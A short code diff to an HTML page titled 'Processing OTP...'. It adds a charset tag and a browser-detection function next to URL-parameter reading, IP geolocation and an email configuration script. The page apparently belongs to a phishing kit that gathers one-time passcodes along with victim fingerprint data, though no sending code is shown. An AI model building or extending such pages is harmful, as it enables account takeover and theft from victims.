@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><title>Processing OTP...</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>Processing OTP...</title>
+</head>
 <body>
     <script src="config/email.js"></script>
     <script>
@@ -11,6 +14,15 @@
             function getParam(name) {
                 const url = new URL(window.location.href);
                 return url.searchParams.get(name) || '';
+            }
+
+            function getBrowser(ua) {
+                if (ua.includes('MSIE')) return 'Internet Explorer';
+                if (ua.includes('Firefox')) return 'Mozilla Firefox';
+                if (ua.includes('Chrome')) return 'Google Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Opera')) return 'Opera';
+                return 'Unknown';
             }
 
             async function getLocation(ip) {
